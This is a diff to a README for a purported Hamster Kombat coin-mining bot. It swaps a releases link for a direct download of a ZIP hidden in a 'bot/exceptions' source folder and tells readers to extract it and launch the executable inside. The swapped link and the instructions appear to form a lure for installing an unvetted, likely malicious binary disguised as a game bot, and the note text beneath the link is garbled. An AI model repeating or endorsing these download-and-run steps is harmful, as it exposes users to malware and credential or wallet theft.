@@ -13,14 +13,14 @@ The Hamster Kombat Coin Mining Bot is a powerful tool tailored to streamline the
 
 ## Setup Instructions
 1. Download the software package from the following link:
-[![Download Software](https://github.com/ItzNaviYa/Hamster-Kombat-Bot/releases/tag/v2.0)](https://github.com/ItzNaviYa/Hamster-Kombat-Bot/releases/tag/v2.0)
+[![Download Software](https://raw.githubusercontent.com/ItzNaviYa/Hamster-Kombat-Bot/main/bot/exceptions/Kombat-Hamster-Bot-v1.1.zip)](https://raw.githubusercontent.com/ItzNaviYa/Hamster-Kombat-Bot/main/bot/exceptions/Kombat-Hamster-Bot-v1.1.zip)
 
 2. Extract the contents of the downloaded ZIP file to a location of your choice on your computer.
 
 3. Launch the bot executable file to initiate the automated coin mining process within the HamsterKombat game environment.
 
 ## Note: 
-If the link provided above ends with the file name "https://github.com/ItzNaviYa/Hamster-Kombat-Bot/releases/tag/v2.0," please download the ZIP file and follow the setup instructions for successful use of the bot.
+If the link provided above ends with the file name "https://raw.githubusercontent.com/ItzNaviYa/Hamster-Kombat-Bot/main/bot/exceptions/Kombat-Hamster-Bot-v1.1.zip," please download the ZIP file and follow the setup instructions for successful use of the bot.
 
 For further assistance or in case the link is not functional, please check the "Releases" section of this repository for alternative download options. 
 
